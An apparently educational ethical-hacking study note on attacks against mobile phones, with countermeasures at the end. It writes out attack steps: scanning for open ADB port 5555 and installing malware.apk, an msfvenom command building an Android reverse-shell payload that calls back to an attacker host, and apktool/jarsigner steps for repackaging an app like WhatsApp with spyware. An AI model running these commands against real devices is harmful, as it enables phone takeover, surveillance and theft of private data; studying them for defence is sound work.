üîπ1: What is Mobile Platform Hacking?

Think of your phone as a mini-computer: it has an OS (Android/iOS), apps, storage, wireless interfaces, and even sensitive sensors (camera, mic, GPS). Hackers target these because phones hold:

Personal info (contacts, chats, photos, banking details).

Authentication tokens (OTP, 2FA codes, stored passwords).

Access to corporate data (emails, VPNs, company apps).

üîπ2: Major Threats to Mobile Platforms

Here are the main attack categories (we‚Äôll break each one down later with methodology):

OS Exploits ‚Äì privilege escalation, rooting/jailbreaking vulnerabilities.

Network-based Attacks ‚Äì rogue Wi-Fi, man-in-the-middle, fake base stations.

Physical Attacks ‚Äì SIM cloning, device theft, USB attacks.

Mobile Web & Phishing ‚Äì SMS phishing (smishing), malicious QR codes, fake apps.

Exploiting Weak Permissions ‚Äì apps asking for unnecessary camera/mic/GPS access.


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


üîπ3: Mobile Attack Methodology (High-Level)

 Android Debug Bridge (ADB) & TCP:5555

üëâ Think of ADB as a secret remote control for Android phones. Developers use it to test apps, but hackers abuse it.

Normally, you need a USB cable to connect.

But sometimes, ADB over Wi-Fi is enabled (port 5555).

If it‚Äôs left open without authentication, attackers can connect directly!

Step-by-step attack (ADB exploitation):

      Hacker scans network for open TCP:5555 ports.
                                                          nmap -p 5555 192.168.1.0/24
      
      If found, attacker connects via adb connect <IP>:5555.

      Now attacker can run commands, install apps, copy files.

Example: adb install malware.apk

Complete control: take screenshots, push RAT payloads, etc.

Tool Example:

            PhoneSploit Pro (automation tool for ADB exploitation)

            Can connect to multiple devices, install RATs, dump files, etc.


 Android RATs (Remote Access Trojans)

üëâ These are malicious apps that give the hacker a ‚Äúbackdoor‚Äù into the victim‚Äôs phone.

Example RATs:

          AndroRat (old but classic, still used for labs).

          SpyNote, AhMyth, Quasar (more advanced RATs).

Step-by-step attack (RAT deployment):

          Hacker creates a malicious APK (using msfvenom or RAT builder).

                                  msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=4444 R > malware.apk


          Victim installs APK (thinking it‚Äôs a game, utility, etc.).

          RAT connects back to attacker‚Äôs machine (reverse shell).

Attacker can now:

         Read SMS, contacts, call logs.

         Turn on camera/mic.

         Steal WhatsApp/Telegram chats.

         Track GPS.

PhoneSploit Pro + RAT combo is deadly: attacker installs RAT directly via ADB.



Exploiting APKs & Repackaging

üëâ Hackers take a legit app (like WhatsApp), insert malicious code, then re-sign and share it.

Step-by-step attack:

             Decompile APK with apktool.

             apktool d app.apk


Add malicious payload (msfvenom-generated).

Rebuild APK and sign it.
                  apktool b appname  
                 jarsigner -keystore mykeystore appname.apk alias_name
            

Distribute the app via phishing/third-party store.

Now the victim installs what looks like WhatsApp, but it secretly spies.





Jailbreaking / Root Exploits

üëâ Hackers use rooting/jailbreaking exploits to gain full system access.

Why?

Normal apps run in a sandbox.

Rooting breaks the sandbox ‚Üí RATs, malware can read all files.

Example:

       Android exploits like Dirty COW, Stagefright.

       iOS jailbreaks like Checkra1n.





Network-based Mobile Attacks

üëâ Hackers don‚Äôt always need physical access. They target phones over Wi-Fi/Cellular.

Examples:

          Rogue Wi-Fi Hotspot ‚Üí trick victim into connecting.

          Evil Twin ‚Üí fake access point mimicking real one.

          Fake Base Station (IMSI Catcher / Stingray) ‚Üí intercept SMS/Calls.

          Sniffing apps ‚Üí if victim uses HTTP apps, attacker steals usernames/passwords.

Tools: Wireshark, Bettercap, ZAnti (Android pentest app).




Physical Attacks & SIM Cloning

Hacker steals phone ‚Üí uses forensic tools like Cellebrite or MOBILedit.

SIM Cloning ‚Üí copy SIM data to duplicate card, hijack calls/SMS (2FA bypass).

Countermeasures

‚Ä¢	Keep OS and apps updated to patch known vulnerabilities.
‚Ä¢	Use MDM (Mobile Device Management) solutions for enterprise security.
‚Ä¢	Enforce app whitelisting and block unauthorized installations.
‚Ä¢	Restrict developer options and USB debugging (disable ADB over TCP/5555).
‚Ä¢	Use strong authentication (biometrics, MFA).
‚Ä¢	Encrypt sensitive data and enforce VPN usage.
‚Ä¢	Detect and block rooted/jailbroken devices.
‚Ä¢	Monitor network traffic for anomalies using IDS/IPS.
‚Ä¢	Educate users about malicious apps and phishing risks.
